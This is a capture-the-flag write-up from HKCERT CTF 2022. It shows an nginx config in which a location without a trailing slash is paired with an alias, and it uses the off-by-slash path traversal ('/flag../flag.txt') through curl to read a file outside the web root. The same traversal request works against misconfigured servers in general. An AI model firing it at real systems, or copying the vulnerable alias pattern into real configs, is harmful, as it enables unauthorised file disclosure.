# Secured Web Service

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

- Challenge difficulty: ★★☆☆☆

## Background

Find the flag in `/var/www/html/flag.txt`

Web: [http://chal.hkcert22.pwnable.hk:28308/flag/](http://chal.hkcert22.pwnable.hk:28308/flag/)

Attachment: [secured-web-service_8a208bc65eff67c1cc1f2502e39337bb.zip](https://file.hkcert22.pwnable.hk/secured-web-service_8a208bc65eff67c1cc1f2502e39337bb.zip)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221112044224.png)

## Find the flag

**In this challenge, we can download an attachment:**
```
┌──(root🌸siunam)-[~/ctf/HKCERT-CTF-2022/Web/Secured-Web-Service]
└─# unzip secured-web-service_8a208bc65eff67c1cc1f2502e39337bb.zip 
Archive:  secured-web-service_8a208bc65eff67c1cc1f2502e39337bb.zip
  inflating: nginx.conf
```

**`nginx.conf`:**
```
worker_processes auto;
error_log stderr warn;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include mime.types;
    default_type application/octet-stream;

    # Define custom log format to include reponse times
    log_format main_timed '$remote_addr - $remote_user [$time_local] "$request" '
                          '$status $body_bytes_sent "$http_referer" '
                          '"$http_user_agent" "$http_x_forwarded_for" '
                          '$request_time $upstream_response_time $pipe $upstream_cache_status';

    access_log /dev/stdout main_timed;
    error_log /dev/stderr notice;

    keepalive_timeout 65;

    # Write temporary files to /tmp so they can be created as a non-privileged user
    client_body_temp_path /tmp/client_temp;
    proxy_temp_path /tmp/proxy_temp_path;
    fastcgi_temp_path /tmp/fastcgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;
    scgi_temp_path /tmp/scgi_temp;

    # Default server definition
    server {
        listen [::]:8080 default_server;
        listen 8080 default_server;
        server_name _;

        sendfile off;
        tcp_nodelay on;
        absolute_redirect off;


        location /flag {
            # First attempt to serve request as file, then
            # as directory, then fall back to index.php
            #try_files $uri $uri/ /index.php?q=$uri&$args;
            alias /var/www/html/flag/;
        }

    }
}
```

This web server has 1 location: `/flag`, and **it's missing the trailling slash**!

**`/flag`:**
```
┌──(root🌸siunam)-[~/ctf/HKCERT-CTF-2022/Web/Secured-Web-Service]
└─# curl 'http://chal.hkcert22.pwnable.hk:28308/flag' 
<html>
<head><title>301 Moved Permanently</title></head>
<body>
<center><h1>301 Moved Permanently</h1></center>
<hr><center>nginx/1.23.2</center>
</body>
</html>
                                                                                                           
┌──(root🌸siunam)-[~/ctf/HKCERT-CTF-2022/Web/Secured-Web-Service]
└─# curl 'http://chal.hkcert22.pwnable.hk:28308/flag/'
<html>
<head>
  <title>Slash</title>
</head>

<body>
  <p>Hello World</p>
  <script>
    location.replace("https://www.youtube.com/watch?v=RQ76vkzmolQ&t=0s")
  </script>
</body>

</html>
```

**When I reach to `/flag/`, it has a JavaScript that redirects me to a rickroll YouTube video.**

**Also, in the `<title>` tag, it's `Slash`, which is a hint of missing the trailling slash!**

**After some goolging, I found this [Tweet](https://twitter.com/x0rz/status/1052899891624710145?lang=en):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221112045704.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HKCERT-CTF-2022/images/Pasted%20image%2020221112045711.png)

**In Hack.lu 2018, a researcher [Orange Tsai](https://twitter.com/orange_8361) from TaiWan discovered a Nginx off-by-slash vulnerability!**

**Since we know the flag is in `/var/www/html/flag.txt` according to the challenge's description, we can just `curl` the flag!**
```
┌──(root🌸siunam)-[~/ctf/HKCERT-CTF-2022/Web/Secured-Web-Service]
└─# curl 'http://chal.hkcert22.pwnable.hk:28308/flag../flag.txt'   
hkcert22{y0u_4re_4s_k1ng_4s_0r4ng3_g0_bug_hunt1ng}
```

We got the flag!

# Conclusion

What we've learned:

1. Nginx Off-By-Slash Vulnerability